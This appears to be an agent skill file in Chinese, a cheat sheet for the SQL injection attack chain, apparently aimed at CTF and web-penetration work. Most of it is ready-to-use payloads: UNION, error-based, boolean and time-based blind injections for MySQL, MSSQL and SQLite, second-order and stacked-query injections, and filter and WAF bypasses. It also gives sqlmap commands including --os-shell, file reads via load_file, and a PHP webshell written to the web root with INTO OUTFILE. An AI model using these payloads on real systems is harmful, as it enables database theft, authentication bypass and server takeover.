---
name: sqli-attack-chain
description: Use when encountering sql注入思维链 - 类型判断、注入技术、提权、写shell
---

# SQL注入攻击链

## Info

- **Domain**: web
- **Tags**: web, sqli

# SQL注入思维链

```
类型判断 → 字符型/数字型/搜索型/JSON型
      ↓
注入技术 → UNION/报错/盲注/堆叠
      ↓
获取数据 → 数据库→表→列→数据
      ↓
提权/写Shell → INTO OUTFILE/udf/堆叠执行
```

---

## 类型判断

| 数据库 | 判断方式 |
|--------|----------|
| MySQL | `version()` `@@version` `sleep()` |
| MSSQL | `@@version` `WAITFOR DELAY` |
| PostgreSQL | `version()` `pg_sleep()` |
| Oracle | `v$version` `UTL_HTTP` |
| SQLite | `sqlite_version()` |

**注入点闭合**: `'` `"` `'` `)` `'))` 等

---

## 注入技术选择

| 场景 | 技术 |
|------|------|
| 有回显 | UNION注入 |
| 有报错 | 报错注入(extractvalue/updatexml) |
| 无回显 | 布尔盲注/时间盲注 |
| 支持堆叠 | 堆叠查询执行多条SQL |

---

## UNION注入

```
1. 确定列数: ORDER BY N
2. 找回显位: UNION SELECT 1,2,3...
3. 获取信息: database()/version()/user()
4. 查表: information_schema.tables
5. 查列: information_schema.columns
6. 获取数据: SELECT col FROM table
```

---

## 报错注入

**MySQL**:
- `extractvalue(1,concat(0x7e,(SELECT...)))`
- `updatexml(1,concat(0x7e,(SELECT...)),1)`
- `floor(rand(0)*2)` group by报错

---

## 盲注技巧

**布尔盲注**: 根据页面差异逐字符猜解
**时间盲注**: 根据响应时间判断

**自动化**: sqlmap
```bash
sqlmap -u url --dbs
sqlmap -u url -D db --tables
sqlmap -u url -D db -T table --dump
```

---

## 写Shell

**MySQL**: `SELECT '<?php eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/s.php'`

**条件**:
- secure_file_priv为空或指定目录
- 知道网站绝对路径
- 有写权限

**MSSQL**: `xp_cmdshell执行命令`

---

## WAF绕过

| 方法 | 示例 |
|------|------|
| 大小写 | SeLeCt |
| 编码 | URL/Hex/Base64 |
| 注释 | `/*!50000select*/` |
| 空白符 | `%09 %0a %0d` |
| 函数替代 | mid()代替substr() |

---

## 11. information_schema详解

```
information_schema 存放所有数据库元信息:

SCHEMATA 表: 存储所有数据库名
  - SCHEMA_NAME: 数据库名

TABLES 表: 存储数据库名和表名
  - TABLE_SCHEMA: 数据库名
  - TABLE_NAME: 表名

COLUMNS 表: 存储数据库名、表名、字段名
  - TABLE_SCHEMA: 数据库名
  - TABLE_NAME: 表名
  - COLUMN_NAME: 字段名
```

MySQL默认数据库: sys, mysql, performance_schema, information_schema

---

## 12. 布尔盲注详细

```sql
-- 判断数据库名长度
1' and length(database())>=13--+    (正常)
1' and length(database())>=14--+    (错误)
→ 数据库名长度为13

-- 逐字符猜解数据库名
' and substr(database(),1,1)='a'--+
' and substr(database(),2,1)='a'--+
-- 用Burp爆破每位字符, substr从1开始排序

-- 获取完整数据库名(快速)
' UNION SELECT group_concat(schema_name) from information_schema.schemama--+
```

---

## 13. 时间型盲注详细

### 各数据库睡眠函数

| 数据库 | 睡眠函数 | 示例 |
|--------|----------|------|
| MySQL | SLEEP() | SLEEP(5) |
| PostgreSQL | PG_SLEEP() | PG_SLEEP(5) |
| MSSQL | WAITFOR DELAY | WAITFOR DELAY '0:0:5' |

### 逐字符推断
```sql
-- 第1步: 确认漏洞
?id=1' AND SLEEP(5)-- -

-- 第2步: 推断数据库名首字符
?id=1' AND IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)-- -
-- 响应慢5秒 → 首字符是'a'; 快速 → 换下一个字符

-- 第3步: 扩展推断表名、列名、数据
?id=1' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='a', SLEEP(5), 0)-- -
```

---

## 14. 二次注入

**原理**: 恶意数据存入数据库(入库时转义处理), 取出时未做二次处理直接使用。

### 攻击步骤
1. 插入恶意数据: `admin'#` (入库时被转义, 但保存原值)
2. 引用恶意数据: 更新密码时 `WHERE username='admin'#'` → #注释掉后续SQL

### 常见构造技巧
```sql
-- 布尔盲注型
注册: admin' AND '1'='1  /  admin' AND '1'='0
查询: SELECT * FROM users WHERE username = 'admin' AND '1'='1'

-- 算术运算型
注册: 0'+1+'0  /  1'+2+'3
查询: WHERE username = '0'+1+'0' → 结果为1

-- 联合查询型
注册: ' UNION SELECT 1,2,3--
查询: SELECT * FROM table WHERE user = '' UNION SELECT 1,2,3-- '

-- 报错注入型
注册: ' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
```

### 数据库查询技巧
```sql
-- 不需要逗号的写法
substr(xxx from 1 for 1)

-- 数据库值转十六进制(防截断)
select hex(hex(database()));
```

---

## 15. 堆叠注入 + MySQL预处理绕过

**核心**: 预处理语句只保护绑定参数, 不能防止通过堆叠注入执行新语句。

### MySQL预处理语句
```sql
PREPARE stmt FROM 'SELECT * FROM users WHERE username = ?';
SET @a = 'admin';
EXECUTE stmt USING @a;
```

### 万能密码 + 预处理绕过
```sql
-- 十六进制编码绕过
admin'; PREPARE stmt FROM 0x53454c454354202a2046524f4d207573657273; EXECUTE stmt; --

-- 用户变量构造
admin'; SET @user = 'admin' OR '1'='1'; PREPARE stmt FROM 'SELECT * FROM users WHERE username = ?'; EXECUTE stmt USING @user; --

-- 动态查询条件
admin'; PREPARE stmt FROM 'SELECT * FROM users WHERE username = ''admin'' OR ?=?'; SET @a=1,@b=1; EXECUTE stmt USING @a,@b; --

-- 字符串拼接绕过(防关键词过滤)
admin'; PREPARE stmt FROM CONCAT('S','ELECT * FROM users'); EXECUTE stmt; --
```

### 登录绕过原理
```php
// 应用只检查 num_rows > 0 并使用第一条记录
if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();  // 获取admin
    $_SESSION['user_id'] = $user['id'];
}
```

### Handler查询技巧
```sql
-- 纯数字表名需加反引号
-1';use supersqli;show columns from `1919810931114514`;#
-1';use supersqli;handler `1919810931114514` open as p;handler p read first;#
```

---

## 16. MD5注入

```php
md5('ffifdyop', true) = 'or'6...]
-- 二进制结果包含 'or' 字符串
-- SQL: WHERE password = ''or'6[乱码]'
-- 以非0数字开头的字符串为真, 实现登录绕过
```

**防护**: 使用md5十六进制输出, 不使用二进制比较

---

## 17. 宽字节注入

**原理**: GBK编码中 `%df%27` → `0xdf5c`(汉字) → `\`被"吃掉" → `'`逃逸

```
基础测试: %bf%27  或  %df%27
确认利用: %bf%27 and 1=1--+  /  %bf%27 and 1=2--+
```

---

## 18. 关键词过滤绕过

| 过滤项 | 绕过方法 | 示例 |
|--------|----------|------|
| select | 双写 | selselectect |
| union | 双写 | uniunionon |
| 大小写 | 混合 | SeLeCt |
| 个别字母 | 十六进制 | selec\x74 |
| 空格 | 替换 | +、/**/、() |
| 无逗号 | 括号+from for | substr(xxx from 1 for 1) |
| 引号 | 十六进制 | table_name=0x7573657273 |
| = | like | table_name like 'users' |
| 注释 | 编码 | %23 (#的编码) |
| 截断函数 | 替代 | mid/substr/right/reverse |

### 无逗号注入
```sql
?id=1' and sleep(ascii(mid(database() from 1 for 1))=109) --+
?id=1'and(sleep(ascii(mid(database()from(1)for(1)))=109))--+
```

### load_file读取文件
```sql
?id=-1 union select 1,load_file("/var/www/html/flag.php"),3--+
```

---

## 19. sqlmap常用参数

```bash
-u URL                  # 目标URL
-p PARAM                # 指定测试参数
--dbs                   # 列出数据库
-D DB --tables          # 列出表
-D DB -T TBL --columns  # 列出列
--dump                  # 导出数据
--current-user          # 当前用户
--current-db            # 当前数据库
--os-shell              # 获取系统shell
--sql-shell             # 执行SQL
-r FILE                 # 加载请求文件
--batch                 # 自动确认
--level=LEVEL           # 测试等级(1-5)
--risk=RISK             # 风险等级(0-3)
--tamper=TAMPER         # 使用绕过脚本
--random-agent          # 随机请求头
--proxy=PROXY           # HTTP代理
```

---

## 20. floor()报错注入

```sql
' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
-- 触发主键重复错误, 返回数据库名
```

---

## 21. SQLite 注入

### sqlite_master 表

SQLite 元数据存储在 `sqlite_master` 表：

| 字段 | 说明 |
|------|------|
| `type` | 类型（table/index/view/trigger） |
| `name` | 名称 |
| `tbl_name` | 所属表名 |
| `rootpage` | 存储页编号 |
| `sql` | 创建 SQL 语句 |

### 联合查询

```sql
-- 确定列数
1' order by 3 --
1' order by 4 --

-- 回显位
0' union select 1,2,3 --
0' union select 1,2,sqlite_version() --

-- 获取建表语句
0' union select 1,2,sql from sqlite_master --
0' union select 1,2,sql from sqlite_master where type='table' --
0' union select 1,2,sql from sqlite_master where type='table' and name='user_data' --

-- 获取所有表名(排除系统表)
0' union select 1,2,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' --

-- 逐条获取(limit + offset)
0' union select 1,2,tbl_name from sqlite_master where type='table' limit 1 offset 1 --

-- 查数据
0' union select id,name,passwd from user_data --
0' union select 1,2,group_concat(passwd) from user_data --
```

### 布尔盲注

```sql
-- 判断版本长度
select * from test where id=1 and length(sqlite_version())=6

-- 逐字符判断
select * from test where id=1 and substr(sqlite_version(),1,1)='3'
```

### 时间盲注

```sql
-- 利用 randomblob 制造延迟
select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)
-- 匹配时生成 1GB blob → 6秒延迟
```

### SQLite 特性

- **没有 information_schema**：使用 `sqlite_master` 替代
- **没有注释符**：用 `--` 结尾即可
- **不支持堆叠注入**：多数驱动不支持多语句
- **没有 sleep()**：用 `randomblob()` 制造延迟
- **类型宽松**：字段类型不影响数据存储